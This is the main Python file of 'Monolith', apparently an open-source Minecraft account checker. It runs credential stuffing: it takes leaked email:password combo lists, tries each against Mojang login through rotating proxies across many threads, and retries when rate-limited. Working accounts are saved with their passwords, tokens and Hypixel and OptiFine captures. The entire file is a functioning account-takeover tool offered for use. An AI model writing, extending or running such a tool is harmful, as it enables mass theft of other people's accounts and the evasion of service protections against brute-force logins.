import os
import logging
import threading
from re import match
from time import sleep
from random import choice

import queue
import asyncio
from aiohttp import ClientTimeout
from console.utils import set_title
from pynput.keyboard import Listener

from checker import loop, clear
from checker.types import File
from checker.color import Color
from checker.worker import Worker
from checker.api.types import Account
from checker.capture.sfa import check_sfa
from checker.api.mojang import mojang_login
from checker.capture.hypixel import check_hypixel
from checker.capture.optifine import check_optifine
from checker.constants import ASCII_TITLE, COMBO_REG
from checker import __title__, __version__, __author__, __license__
from checker.functions import load_file, get_input, parse_proxy, create_results


class Monolith(object):
    def __init__(self) -> None:
        self.combos = None
        self.proxies = None
        self.proxy_type = None
        self.timeout = None
        self.threads = None
        self.workers = None
        self.save_thread = None
        self.results = None
        self.queue = asyncio.Queue()

        self.good = 0
        self.free = 0
        self.bad = 0
        self.errors = 0

        self.nfa = 0
        self.sfa = 0

        self.checked = 0

    @staticmethod
    async def wait_for_press(message: str) -> None:
        logging.info(f"Press any key to {message}!" if os.name == "nt" else f"Press [ENTER] to {message}!")

        if os.name == "nt":
            def stop_listener(*args):
                listener.stop()

            listener = Listener(on_press=stop_listener)
            listener.start()
            listener.join()
        else:
            input()

    async def get_settings(self):
        await self.wait_for_press("load combos")
        self.combos = list(await load_file(File.COMBO))

        await self.wait_for_press("load proxies")
        self.proxies = list(await load_file(File.PROXY))

        self.proxy_type = await get_input(
            "Proxy Type [http/https/socks4/socks5]:", choices=("http", "https", "socks4", "socks5")
        )
        self.timeout = await get_input("Timeout (in ms):", convert_int=True)
        self.threads = await get_input("Threads:", convert_int=True)
        self.workers = await get_input("Workers per Thread:", convert_int=True)

        clear()

        print(Color.MAIN + ASCII_TITLE + Color.RESET)
        logging.info(f"Combos: {len(self.combos)}")
        logging.info(f"Proxies: {len(self.proxies)}")
        logging.info(f"Proxy Type: {self.proxy_type}")
        logging.info(f"Timeout: {self.timeout}")
        logging.info(f"Threads: {self.threads}")
        logging.info(f"Workers: {self.workers}")

    def random_proxy(self):
        try:
            return parse_proxy(choice(self.proxies), self.proxy_type)
        except Exception:
            return self.random_proxy()

    def cli(self):
        while True:
            clear()
            print(Color.MAIN + ASCII_TITLE + Color.RESET)

            logging.info(f"Checked: {self.checked}/{len(self.combos)}")
            logging.info(f"Good: {self.good}")
            logging.info(f"Free: {self.free}")
            logging.info(f"Bad: {self.bad}")
            print()
            logging.info(f"NFA: {self.nfa}")
            logging.info(f"SFA: {self.sfa}")
            print()
            logging.info(f"Errors: {self.errors}")

            sleep(1)

    def title(self):
        while True:
            set_title(f"{__title__} {__version__} by {__author__} | Checked: {self.checked}/{len(self.combos)} - Good: {self.good} - Free: {self.free} - Bad: {self.bad}")
            sleep(0.05)

    async def login(self, line):
        if not match(COMBO_REG, line):
            self.bad += 1
            self.checked += 1
            return

        spl = line.split(":")

        try:
            response = await mojang_login(spl[0], spl[1], self.random_proxy(), ClientTimeout(total=self.timeout))

            if response.account_type == Account.PREMIUM:
                capture = [("=" * 50), f"Email: {spl[0]}", f"Password: {spl[1]}", f"Line: {line}"]

                for cap in (
                        check_sfa(response.access_token), check_optifine(response.username),
                        check_hypixel(response.uuid), ("=" * 50),
                        "\n"
                ):
                    capture.append(cap)

                self.save_thread.save((f"{self.results}/good.txt", "\n".join(capture)))
            elif response.account_type == Account.FREE:
                self.free += 1
                self.save_thread.save((f"{self.results}/free.txt", f"{line}\n"))
            elif response.account_type == Account.INVALID:
                self.bad += 1
            elif response.status_code == 429:
                await asyncio.sleep(30)
                await self.login(line)
            else:
                self.bad += 1
            self.checked += 1
        except Exception:
            self.errors += 1
            await self.login(line)

    async def main(self) -> None:
        print(Color.MAIN + ASCII_TITLE + Color.RESET)
        logging.info(f"{__title__} {__version__} by {__author__}")
        logging.info(f"Attention: This is a free, open-source tool available on GitHub.")
        logging.info(f"License: {__license__}")
        logging.info("GitHub: https://github.com/Geographs/Monolith")
        logging.info("Support Server: https://discord.gg/x5kxAeGUcg")
        print()

        await self.wait_for_press("start")
        await self.get_settings()

        [self.queue.put_nowait(self.login(combo)) for combo in self.combos]

        self.results = create_results()

        self.save_thread = SaveThread()
        self.save_thread.start()

        threading.Thread(target=self.cli, daemon=True).start()
        threading.Thread(target=self.title, daemon=True).start()

        workers = []

        for _ in range(self.threads):
            workers.append(Worker(self.queue, workers=self.workers))

        for thread in workers:
            thread.start()

        for thread in workers:
            thread.join()


class SaveThread(threading.Thread):
    def __init__(self):
        super().__init__()
        self.queue = queue.Queue()

    def save(self, line: tuple):
        self.queue.put(line)

    def run(self):
        while True:
            item = self.queue.get()
            open(item[0], "a", encoding="utf-8").write(item[1])
            self.queue.task_done()


if __name__ == "__main__":
    app = Monolith()
    loop.run_until_complete(app.main())
